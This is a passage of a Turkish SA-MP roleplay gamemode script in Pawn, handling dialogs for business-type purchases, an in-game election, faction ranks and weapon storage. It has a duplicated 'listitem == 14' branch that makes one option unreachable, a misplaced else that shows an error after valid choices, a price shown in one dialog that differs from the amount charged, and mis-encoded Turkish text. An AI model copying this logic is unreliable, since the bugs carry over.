     	if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, egirisbeyaz, "Kiyafet Secimi");
		if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, egirissiyah, "Kiyafet Secimi");
		if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, kgirisbeyaz, "Kiyafet Secimi");
		if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, kgirissiyah, "Kiyafet Secimi");
	    }
		return 1;
	}
	if(dialogid == 888)
	{
	    if(response)
	    {
	 	    if(listitem == 0)
	   		{
                ShowPlayerDialog(playerid, 889, DIALOG_STYLE_MSGBOX, "Seçim Merkezi", "{FFFFFF}Oyunuzu 'Cumhuriyetçi Parti - {ff0000}Marshall Kingsley{FFFFFF}' olarak kullanmak istediðinize emin misiniz?", "Evet", "Hayýr");
	   		}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, 890, DIALOG_STYLE_MSGBOX, "Seçim Merkezi", "{FFFFFF}Oyunuzu 'Demokrat Parti - {ff0000}Sarah Pressley{FFFFFF}' olarak kullanmak istediðinize emin misiniz?", "Evet", "Hayýr");
			}
	    }
		return 1;
	}
	if(dialogid == 670)
	{
	    if(response)
	    {
	 	    if(listitem == 0)
	   		{
                ShowPlayerDialog(playerid, 671, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýþyeri Tipi", "{FFFFFF}Ýþyeri tipinizi '{ff0000}Market{FFFFFF}' olarak deðiþtirmek istediðinize emin misiniz?\nÜcret: 5.000"DOLAR"$", "Evet", "Hayýr");
	   		}
			if(listitem == 1)
	   		{
                ShowPlayerDialog(playerid, 672, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýþyeri Tipi", "{FFFFFF}Ýþyeri tipinizi '{ff0000}Restorant{FFFFFF}' olarak deðiþtirmek istediðinize emin misiniz?\nÜcret: 3.000"DOLAR"$", "Evet", "Hayýr");
	   		}
	   		if(listitem == 2)
	   		{
                ShowPlayerDialog(playerid, 673, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýþyeri Tipi", "{FFFFFF}Ýþyeri tipinizi '{ff0000}Bar{FFFFFF}' olarak deðiþtirmek istediðinize emin misiniz?\nÜcret: 2.500"DOLAR"$", "Evet", "Hayýr");
	   		}
	   		if(listitem == 3)
	   		{
                ShowPlayerDialog(playerid, 674, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýþyeri Tipi", "{FFFFFF}Ýþyeri tipinizi '{ff0000}Kýyafet Dükkaný{FFFFFF}' olarak deðiþtirmek istediðinize emin misiniz?\nÜcret: 5.000"DOLAR"$", "Evet", "Hayýr");
	   		}
	   		if(listitem == 4)
	   		{
                ShowPlayerDialog(playerid, 675, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýþyeri Tipi", "{FFFFFF}Ýþyeri tipinizi '{ff0000}Özel Kýyafet Dükkaný{FFFFFF}' olarak deðiþtirmek istediðinize emin misiniz?\nÜcret: 10.000"DOLAR"$", "Evet", "Hayýr");
	   		}
	   		if(listitem == 5)
	   		{
                ShowPlayerDialog(playerid, 676, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýþyeri Tipi", "{FFFFFF}Ýþyeri tipinizi '{ff0000}Silah Dükkaný{FFFFFF}' olarak deðiþtirmek istediðinize emin misiniz?\nÜcret: 20.000"DOLAR"$", "Evet", "Hayýr");
	   		}
	   		if(listitem == 6)
	   		{
                ShowPlayerDialog(playerid, 677, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýþyeri Tipi", "{FFFFFF}Ýþyeri tipinizi '{ff0000}Depo{FFFFFF}' olarak deðiþtirmek istediðinize emin misiniz?\nÜcret: 2.500"DOLAR"$", "Evet", "Hayýr");
	   		}
	   		if(listitem == 7)
	   		{
                ShowPlayerDialog(playerid, 678, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýþyeri Tipi", "{FFFFFF}Ýþyeri tipinizi '{ff0000}Mobilya Dükkaný{FFFFFF}' olarak deðiþtirmek istediðinize emin misiniz?\nÜcret: 10.000"DOLAR"$", "Evet", "Hayýr");
	   		}
	   		if(listitem == 8)
	   		{
                ShowPlayerDialog(playerid, 679, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýþyeri Tipi", "{FFFFFF}Ýþyeri tipinizi '{ff0000}GYM{FFFFFF}' olarak deðiþtirmek istediðinize emin misiniz?\nÜcret: 5.000"DOLAR"$", "Evet", "Hayýr");
	   		}
	   		if(listitem == 9)
	   		{
                ShowPlayerDialog(playerid, 680, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýþyeri Tipi", "{FFFFFF}Ýþyeri tipinizi '{ff0000}Modifiye Garajý{FFFFFF}' olarak deðiþtirmek istediðinize emin misiniz?\nÜcret: 300.000"DOLAR"$", "Evet", "Hayýr");
	   		}
	   		if(listitem == 10)
	   		{
                ShowPlayerDialog(playerid, 681, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýþyeri Tipi", "{FFFFFF}Ýþyeri tipinizi '{ff0000}Sevkiyat Þirketi{FFFFFF}' olarak deðiþtirmek istediðinize emin misiniz?\nÜcret: 500.000"DOLAR"$", "Evet", "Hayýr");
	   		}
	   		if(listitem == 11)
	   		{
                ShowPlayerDialog(playerid, 682, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýþyeri Tipi", "{FFFFFF}Ýþyeri tipinizi '{ff0000}Spor Aletleri Dükkaný{FFFFFF}' olarak deðiþtirmek istediðinize emin misiniz?\nÜcret: 2.500"DOLAR"$", "Evet", "Hayýr");
	   		}
	   		if(listitem == 12)
	   		{
                ShowPlayerDialog(playerid, 683, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýþyeri Tipi", "{FFFFFF}Ýþyeri tipinizi '{ff0000}Galeri{FFFFFF}' olarak deðiþtirmek istediðinize emin misiniz?\nÜcret: 400.000"DOLAR"$", "Evet", "Hayýr");
	   		}
	   		if(listitem == 13)
	   		{
                ShowPlayerDialog(playerid, 684, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýþyeri Tipi", "{FFFFFF}Ýþyeri tipinizi '{ff0000}Super Sport Galeri{FFFFFF}' olarak deðiþtirmek istediðinize emin misiniz?\nÜcret: 600.000"DOLAR"$", "Evet", "Hayýr");
	   		}
	   		if(listitem == 14)
	   		{
                ShowPlayerDialog(playerid, 685, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýþyeri Tipi", "{FFFFFF}Ýþyeri tipinizi '{ff0000}Hafriyat Þirketi{FFFFFF}' olarak deðiþtirmek istediðinize emin misiniz?\nÜcret: 500.000"DOLAR"$", "Evet", "Hayýr");
	   		}
			if(listitem == 14)
	   		{
                ShowPlayerDialog(playerid, 686, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýþyeri Tipi", "{FFFFFF}Ýþyeri tipinizi '{ff0000}Ofis{FFFFFF}' olarak deðiþtirmek istediðinize emin misiniz?\nÜcret: 5.000"DOLAR"$", "Evet", "Hayýr");
	   		}
			else Hata(playerid, "Ýnaktif!");
	    }
		return 1;
	}
	if(dialogid == 671)
	{
	    if(response)
		{
		    new mesafe;
	    	if(!IsPlayerInAnyVehicle(playerid)) mesafe = IsyeriMesafesi(2.0, playerid);
			else mesafe = IsyeriMesafesi(5.0, playerid);
			if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli paranýz yok.[5.000$]");
			GivePlayerCash(playerid, -5000);
   			Isyeri[mesafe][itip] = 1;
			Bilgi(playerid, "Ýþyerinin tipini Market olarak deðiþtirdiniz.");
	    }
	    return 1;
	}
	if(dialogid == 672)
	{
	    if(response)
		{
		    new mesafe;
	    	if(!IsPlayerInAnyVehicle(playerid)) mesafe = IsyeriMesafesi(2.0, playerid);
			else mesafe = IsyeriMesafesi(5.0, playerid);
			if(GetPlayerCash(playerid) < 3000) return Hata(playerid, "Yeterli paranýz yok.[3.000$]");
			GivePlayerCash(playerid, -3000);
   			Isyeri[mesafe][itip] = 2;
			Bilgi(playerid, "Ýþyerinin tipini Restorant olarak deðiþtirdiniz.");
	    }
	    return 1;
	}
	if(dialogid == 673)
	{
	    if(response)
		{
		    new mesafe;
	    	if(!IsPlayerInAnyVehicle(playerid)) mesafe = IsyeriMesafesi(2.0, playerid);
			else mesafe = IsyeriMesafesi(5.0, playerid);
			if(GetPlayerCash(playerid) < 2500) return Hata(playerid, "Yeterli paranýz yok.[2.500$]");
			GivePlayerCash(playerid, -2500);
   			Isyeri[mesafe][itip] = 5;
			Bilgi(playerid, "Ýþyerinin tipini Bar olarak deðiþtirdiniz.");
	    }
	    return 1;
	}
	if(dialogid == 674)
	{
	    if(response)
		{
		    new mesafe;
	    	if(!IsPlayerInAnyVehicle(playerid)) mesafe = IsyeriMesafesi(2.0, playerid);
			else mesafe = IsyeriMesafesi(5.0, playerid);
			if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli paranýz yok.[5.000$]");
			GivePlayerCash(playerid, -5000);
   			Isyeri[mesafe][itip] = 6;
			Bilgi(playerid, "Ýþyerinin tipini Kýyafet Dükkaný olarak deðiþtirdiniz.");
	    }
	    return 1;
	}
	if(dialogid == 675)
	{
	    if(response)
		{
		    new mesafe;
	    	if(!IsPlayerInAnyVehicle(playerid)) mesafe = IsyeriMesafesi(2.0, playerid);
			else mesafe = IsyeriMesafesi(5.0, playerid);
			if(GetPlayerCash(playerid) < 10000) return Hata(playerid, "Yeterli paranýz yok.[10.000$]");
			GivePlayerCash(playerid, -10000);
   			Isyeri[mesafe][itip] = 18;
			Bilgi(playerid, "Ýþyerinin tipini Özel Kýyafet Dükkaný olarak deðiþtirdiniz.");
	    }
	    return 1;
	}
	if(dialogid == 676)
	{
	    if(response)
		{
		    new mesafe;
	    	if(!IsPlayerInAnyVehicle(playerid)) mesafe = IsyeriMesafesi(2.0, playerid);
			else mesafe = IsyeriMesafesi(5.0, playerid);
			if(GetPlayerCash(playerid) < 20000) return Hata(playerid, "Yeterli paranýz yok.[20.000$]");
			GivePlayerCash(playerid, -20000);
   			Isyeri[mesafe][itip] = 7;
			Bilgi(playerid, "Ýþyerinin tipini Silah Dükkaný olarak deðiþtirdiniz.");
	    }
	    return 1;
	}
	if(dialogid == 677)
	{
	    if(response)
		{
		    new mesafe;
	    	if(!IsPlayerInAnyVehicle(playerid)) mesafe = IsyeriMesafesi(2.0, playerid);
			else mesafe = IsyeriMesafesi(5.0, playerid);
			if(GetPlayerCash(playerid) < 2500) return Hata(playerid, "Yeterli paranýz yok.[2.500$]");
			GivePlayerCash(playerid, -2500);
   			Isyeri[mesafe][itip] = 8;
			Bilgi(playerid, "Ýþyerinin tipini Depo olarak deðiþtirdiniz.");
	    }
	    return 1;
	}
	if(dialogid == 678)
	{
	    if(response)
		{
		    new mesafe;
	    	if(!IsPlayerInAnyVehicle(playerid)) mesafe = IsyeriMesafesi(2.0, playerid);
			else mesafe = IsyeriMesafesi(5.0, playerid);
			if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli paranýz yok.[5.000$]");
			GivePlayerCash(playerid, -5000);
   			Isyeri[mesafe][itip] = 12;
			Bilgi(playerid, "Ýþyerinin tipini Mobilya Dükkaný olarak deðiþtirdiniz.");
	    }
	    return 1;
	}
	if(dialogid == 679)
	{
	    if(response)
		{
		    new mesafe;
	    	if(!IsPlayerInAnyVehicle(playerid)) mesafe = IsyeriMesafesi(2.0, playerid);
			else mesafe = IsyeriMesafesi(5.0, playerid);
			if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli paranýz yok.[5.000$]");
			GivePlayerCash(playerid, -5000);
   			Isyeri[mesafe][itip] = 14;
			Bilgi(playerid, "Ýþyerinin tipini GYM olarak deðiþtirdiniz.");
	    }
	    return 1;
	}
	if(dialogid == 680)
	{
	    if(response)
		{
		    new mesafe;
	    	if(!IsPlayerInAnyVehicle(playerid)) mesafe = IsyeriMesafesi(2.0, playerid);
			else mesafe = IsyeriMesafesi(5.0, playerid);
			if(GetPlayerCash(playerid) < 300000) return Hata(playerid, "Yeterli paranýz yok.[300.000$]");
			GivePlayerCash(playerid, -300000);
   			Isyeri[mesafe][itip] = 15;
			Bilgi(playerid, "Ýþyerinin tipini Modifiye Garajý olarak deðiþtirdiniz.");
	    }
	    return 1;
	}
	if(dialogid == 681)
	{
	    if(response)
		{
		    new mesafe;
	    	if(!IsPlayerInAnyVehicle(playerid)) mesafe = IsyeriMesafesi(2.0, playerid);
			else mesafe = IsyeriMesafesi(5.0, playerid);
			if(GetPlayerCash(playerid) < 500000) return Hata(playerid, "Yeterli paranýz yok.[500.000$]");
			GivePlayerCash(playerid, -500000);
   			Isyeri[mesafe][itip] = 16;
			Bilgi(playerid, "Ýþyerinin tipini Sevkiyat Þirketi olarak deðiþtirdiniz.");
	    }
	    return 1;
	}
	if(dialogid == 682)
	{
	    if(response)
		{
		    new mesafe;
	    	if(!IsPlayerInAnyVehicle(playerid)) mesafe = IsyeriMesafesi(2.0, playerid);
			else mesafe = IsyeriMesafesi(5.0, playerid);
   			if(GetPlayerCash(playerid) < 2500) return Hata(playerid, "Yeterli paranýz yok.[2.500$]");
			GivePlayerCash(playerid, -2500);
   			Isyeri[mesafe][itip] = 19;
			Bilgi(playerid, "Ýþyerinin tipini Spor Aletleri Dükkaný olarak deðiþtirdiniz.");
	    }
	    return 1;
	}
	if(dialogid == 683)
	{
	    if(response)
		{
		    new mesafe;
	    	if(!IsPlayerInAnyVehicle(playerid)) mesafe = IsyeriMesafesi(2.0, playerid);
			else mesafe = IsyeriMesafesi(5.0, playerid);
			if(GetPlayerCash(playerid) < 400000) return Hata(playerid, "Yeterli paranýz yok.[400.000$]");
			GivePlayerCash(playerid, -400000);
   			Isyeri[mesafe][itip] = 20;
			Bilgi(playerid, "Ýþyerinin tipini Galeri olarak deðiþtirdiniz.");
	    }
	    return 1;
	}
	if(dialogid == 684)
	{
	    if(response)
		{
		    new mesafe;
	    	if(!IsPlayerInAnyVehicle(playerid)) mesafe = IsyeriMesafesi(2.0, playerid);
			else mesafe = IsyeriMesafesi(5.0, playerid);
			if(GetPlayerCash(playerid) < 1000000) return Hata(playerid, "Yeterli paranýz yok.[1.000.000$]");
			GivePlayerCash(playerid, -1000000);
   			Isyeri[mesafe][itip] = 21;
			Bilgi(playerid, "Ýþyerinin tipini Super Sport Galeri olarak deðiþtirdiniz.");
	    }
	    return 1;
	}
	if(dialogid == 685)
	{
	    if(response)
		{
		    new mesafe;
	    	if(!IsPlayerInAnyVehicle(playerid)) mesafe = IsyeriMesafesi(2.0, playerid);
			else mesafe = IsyeriMesafesi(5.0, playerid);
			if(GetPlayerCash(playerid) < 500000) return Hata(playerid, "Yeterli paranýz yok.[500.000$]");
			GivePlayerCash(playerid, -500000);
   			Isyeri[mesafe][itip] = 22;
			Bilgi(playerid, "Ýþyerinin tipini Hafriyat Þirketi olarak deðiþtirdiniz.");
	    }
	    return 1;
	}
	if(dialogid == 686)
	{
	    if(response)
		{
		    new mesafe;
	    	if(!IsPlayerInAnyVehicle(playerid)) mesafe = IsyeriMesafesi(2.0, playerid);
			else mesafe = IsyeriMesafesi(5.0, playerid);
			if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Yeterli paranýz yok.[5.000$]");
			GivePlayerCash(playerid, -5000);
   			Isyeri[mesafe][itip] = 23;
			Bilgi(playerid, "Ýþyerinin tipini Ofis olarak deðiþtirdiniz.");
	    }
	    return 1;
	}
	if(dialogid == 889)
	{
	    if(response)
	    {
			Bilgi(playerid, "Oyunuzu '{FFFFFF}Cumhuriyetçi Parti - Marshall Kingsley{5cb85c}' olarak kullandýnýz.");
			Secim[marshall] += 1;
			Karakter[playerid][oydurum] = 1;
			SecimlerKaydet();
	    }
	    else
	    {
     	ShowPlayerDialog(playerid, 888, DIALOG_STYLE_LIST, "Seçim Merkezi", "{FFFFFF}Cumhuriyetçi Parti - {ff0000}Marshall Kingsley\n{FFFFFF}Demokrat Parti - {ff0000}Sarah Pressley", "Oy Ver", "Kapat");
	    }
		return 1;
	}
	if(dialogid == 890)
	{
	    if(response)
	    {
			Bilgi(playerid, "Oyunuzu '{FFFFFF}Demokrat Parti - Sarah Pressley{5cb85c}' olarak kullandýnýz.");
			Secim[sarah] += 1;
			Karakter[playerid][oydurum] = 1;
			SecimlerKaydet();
	    }
	    else
	    {
     	ShowPlayerDialog(playerid, 888, DIALOG_STYLE_LIST, "Seçim Merkezi", "{FFFFFF}Cumhuriyetçi Parti - {ff0000}Marshall Kingsley\n{FFFFFF}Demokrat Parti - {ff0000}Sarah Pressley", "Oy Ver", "Kapat");
	    }
		return 1;
	}
	if(dialogid == 231)
	{
		if(response)
		{
		    if(listitem == 0) FactMenu(playerid),factayarliyo[playerid] = 0;
			if(listitem == 1)
			{
				new str[1024];
    			strcat(str, Birlik[Karakter[playerid][birlik]][rutbe1]);
			    strcat(str, "\n");
			    strcat(str, Birlik[Karakter[playerid][birlik]][rutbe2]);
			    strcat(str, "\n");
			    strcat(str, Birlik[Karakter[playerid][birlik]][rutbe3]);
			    strcat(str, "\n");
			    strcat(str, Birlik[Karakter[playerid][birlik]][rutbe4]);
				strcat(str, "\n");
				strcat(str, Birlik[Karakter[playerid][birlik]][rutbe5]);
				strcat(str, "\n");
				strcat(str, Birlik[Karakter[playerid][birlik]][rutbe6]);
				strcat(str, "\n");
				strcat(str, Birlik[Karakter[playerid][birlik]][rutbe7]);
				strcat(str, "\n");
                strcat(str, Birlik[Karakter[playerid][birlik]][rutbe8]);
				strcat(str, "\n");
				strcat(str, Birlik[Karakter[playerid][birlik]][rutbe9]);
				strcat(str, "\n");
				strcat(str, Birlik[Karakter[playerid][birlik]][rutbe10]);
				strcat(str, "\n");
				strcat(str, Birlik[Karakter[playerid][birlik]][rutbe11]);
				strcat(str, "\n");
        		strcat(str, Birlik[Karakter[playerid][birlik]][rutbe12]);
			    if(Birlik[Karakter[playerid][birlik]][seviye] >= 2)
				{
				    strcat(str, "\n");
				    strcat(str, Birlik[Karakter[playerid][birlik]][rutbe13]);
				    strcat(str, "\n");
				    strcat(str, Birlik[Karakter[playerid][birlik]][rutbe14]);
				    strcat(str, "\n");
					strcat(str, Birlik[Karakter[playerid][birlik]][rutbe15]);
				    strcat(str, "\n");
      				if(Birlik[Karakter[playerid][birlik]][seviye] >= 3)
				    {
             			strcat(str, Birlik[Karakter[playerid][birlik]][rutbe16]);
				        strcat(str, "\n");
				        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe17]);
				        strcat(str, "\n");
				        if(Birlik[Karakter[playerid][birlik]][seviye] >= 4)
						{
					       	strcat(str, Birlik[Karakter[playerid][birlik]][rutbe18]);
					        strcat(str, "\n");
					        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe19]);
					        strcat(str, "\n");
					        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe20]);
						}
					}
				}
				ShowPlayerDialog(playerid, 232, DIALOG_STYLE_LIST, BirlikBaslik(playerid), str, "RütbeVer", "Geri");
			}
			if(listitem == 2)
			{
			    if(Karakter[playerid][rutbe] >= Karakter[factayarliyo[playerid]][rutbe]) return Hata(playerid, "Bu oyuncuyu birlikten çýkaramazsýnýz.");
			    Bilgi(playerid, "Oyuncuyu birlikten çýkardýnýz.");
			    new mstring[128];
			    format(mstring, sizeof(mstring), "%s isimli oyuncu birlikten atýldý.",OyuncuAdiniBul(factayarliyo[playerid]));
			    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD) LSPDGonder(mstring);
			    else BirlikGonder(playerid,mstring);
				Karakter[factayarliyo[playerid]][birlik] = 0;
				Karakter[factayarliyo[playerid]][rutbe] = 0;
				factayarliyo[playerid] = 0;
			}
			if(listitem == 3)
			{
			    new pid = factayarliyo[playerid];
			    if(!BirlikYetkili(pid))
			    {
			    	Bilgi(playerid, "Oyuncuyu yetkili yaptýnýz.");
			    	new query[128];
			    	format(query, sizeof(query), "INSERT INTO `birlikyetkili` (`birlikid`,`sqlid`) VALUES ('%d','%d')",Karakter[playerid][birlik],Karakter[pid][sqlid]);
			    	mysql_tquery(1,query);
				}
				else
				{
				    Bilgi(playerid, "Oyuncuynun yetkisini aldýnýz.");
			    	new query[128];
			    	format(query, sizeof(query), "DELETE FROM `birlikyetkili` WHERE `birlikid` = '%d' AND `sqlid` = '%d'",Karakter[playerid][birlik],Karakter[pid][sqlid]);
			    	mysql_tquery(1,query);
				}
			}
		}
	    else
		{
			FactMenu(playerid);
			factayarliyo[playerid] = 0;
		}
	    return 1;
	}
	if(dialogid == 232)
	{
	    if(response)
	    {
	        new mstring[256],pid=factayarliyo[playerid];
			switch(listitem)
			{
			    case 0:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe1]);
			    case 1:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe2]);
			    case 2:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe3]);
			    case 3:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe4]);
			    case 4:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe5]);
			    case 5:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe6]);
			    case 6:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe7]);
			    case 7:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe8]);
			    case 8:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe9]);
			    case 9:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe10]);
                case 10:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe11]);
                case 11:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe12]);
                case 12:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe13]);
                case 13:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe14]);
                case 14:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe15]);
                case 15:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe16]);
                case 16:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe17]);
                case 17:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe18]);
                case 18:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe19]);
                case 19:format(mstring, sizeof(mstring), "%s isimli oyuncunun rütbesi %s olarak deðiþtirildi.", OyuncuAdiniBul(pid), Birlik[Karakter[playerid][birlik]][rutbe20]);
			}
			Bilgi(playerid, mstring);
			if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD) LSPDGonder(mstring);
			else BirlikGonder(playerid,mstring);
   			Karakter[factayarliyo[playerid]][rutbe] = listitem+1;
			factayarliyo[playerid] = 0;
	    }
		else
		{
		    FactMenu(playerid);
		    factayarliyo[playerid] = 0;
		}
		return 1;
	}
	if(dialogid == 233)
	{
		if(response)
		{
		    new query[128],sid,silahisim1[60],rows,fields;
		    format(query, sizeof(query), "SELECT * FROM `evsilah` WHERE `evID` = '%d'",Ev[silahalev[playerid]][eid]);
			new Cache:cache = mysql_query(query,true);
			cache_get_data(rows, fields, g_iHandle);
			sid=cache_get_field_content_int(listitem, "silahID");
			cache_delete(cache);
			Karakter[playerid][SilahM][sid]++;
			format(query,sizeof(query), "DELETE FROM `evsilah` WHERE `evID` = '%d' AND `silahID` = '%d' LIMIT 1",Ev[silahalev[playerid]][eid], sid);
			mysql_tquery(1,query);
            switch(sid)
		    {
		        case 0: silahisim1 = "Boþ";
		        case 1: silahisim1 = "Muþta";
		        case 2: silahisim1 = "Golf Sopasý";
		        case 3: silahisim1 = "Cop";
		        case 4: silahisim1 = "Býçak";
		        case 5: silahisim1 = "Beyzbol Sopasý";
		        case 6: silahisim1 = "Kürek";
		        case 7: silahisim1 = "Bilardo Sopasý";
		        case 8: silahisim1 = "Katana";
		        case 9: silahisim1 = "Testere";
		        case 10: silahisim1 = "Mor Dildo";
		        case 11: silahisim1 = "Küçük Beyaz Vibrator";
		        case 12: silahisim1 = "Büyük Beyaz Vibrator";
		        case 13: silahisim1 = "Gümüþ Vibrator";
		        case 14: silahisim1 = "Çiçek Demeti";
		        case 15: silahisim1 = "Baston";
		        case 16: silahisim1 = "El Bombasý";
		        case 17: silahisim1 = "Sis Bombasý";
		        case 18: silahisim1 = "Molotof";
		        case 22: silahisim1 = "Pistol";
		        case 23: silahisim1 = "Susturuculu Pistol";
		        case 24: silahisim1 = "Desert Eagle";
		        case 25: silahisim1 = "Shotgun";
		        case 26: silahisim1 = "Sawn-off Shotgun";
		        case 27: silahisim1 = "Combat Shotgun";
		        case 28: silahisim1 = "Micro SMG";
		        case 29: silahisim1 = "Mp5";
		        case 30: silahisim1 = "AK47";
		        case 31: silahisim1 = "M4";
		        case 32: silahisim1 = "Tec9";
		        case 33: silahisim1 = "Country Rifle";
		        case 34: silahisim1 = "Sniper Rifle";
		        case 35: silahisim1 = "Rocket Launcher";
		        case 36: silahisim1 = "HS Rocket Launcher";
		        case 37: silahisim1 = "Flamethrower";
		        case 38: silahisim1 = "Minigun";
		        case 39: silahisim1 = "Satchel Charge";
		        case 41: silahisim1 = "Spraycan";
		        case 42: silahisim1 = "Yangýn Söndürücü Tüp";
		        case 43: silahisim1 = "Kamera";
		        case 46: silahisim1 = "Paraþüt";
			}
			format(query, sizeof(query), "%d idli evden %s isimli silahý aldýnýz.",silahalev[playerid],silahisim1);
			Bilgi(playerid, query);
			silahalev[playerid] = 0;
		}
		return 1;
	}
	if(dialogid == 234)
	{
		if(response)
		{
		    if(!IsPlayerInVehicle(playerid, silahalev[playerid])) return Hata(playerid, "Silahý almak istediðiniz aracýn içerisinde olmalýsýnýz.");
		    new query[128],silahisim1[60],rows,fields,_no,_id;
		    format(query, sizeof(query), "SELECT * FROM `aracsilah` WHERE `aracID` = '%d'",Arac[silahalev[playerid]][aid]);
			new Cache:cache = mysql_query(query,true);
			cache_get_data(rows, fields, g_iHandle);
			_no=cache_get_field_content_int(listitem, "no");
			cache_delete(cache);
			foreach(new i : Guns)
			{
				if(OyuncuSilah[i][no] == _no)
				{
					_id=i;
					break;
				}
			}
			if(OyuncuSilah[_id][oyuncuid] != Karakter[playerid][sqlid] && OyuncuSilah[_id][oyuncuid] != 0) return Hata(playerid, "Bu silahý alamazsýnýz.");
			if(HafifSilah(OyuncuSilah[_id][silahid]) && HafifSilahVar(playerid)) return Hata(playerid, "Üzerinizde sadece 1 adet hafif silah bulundurabilirsiniz.");
			if(AgirSilah(OyuncuSilah[_id][silahid]) && AgirSilahVar(playerid)) return Hata(playerid, "Üzerinizde sadece 1 adet aðýr silah bulundurabilirsiniz.");
			format(query,sizeof(query), "DELETE FROM `aracsilah` WHERE `aracID` = '%d' AND `no` = '%d'",Arac[silahalev[playerid]][aid], _no);
			mysql_tquery(1,query);
            switch(OyuncuSilah[_id][silahid])
		    {
		        case 0: silahisim1 = "Boþ";
		        case 1: silahisim1 = "Muþta";
		        case 2: silahisim1 = "Golf Sopasý";
		        case 3: silahisim1 = "Cop";
		        case 4: silahisim1 = "Býçak";
		        case 5: silahisim1 = "Beyzbol Sopasý";
		        case 6: silahisim1 = "Kürek";
		        case 7: silahisim1 = "Bilardo Sopasý";
		        case 8: silahisim1 = "Katana";
		        case 9: silahisim1 = "Testere";
		        case 10: silahisim1 = "Mor Dildo";
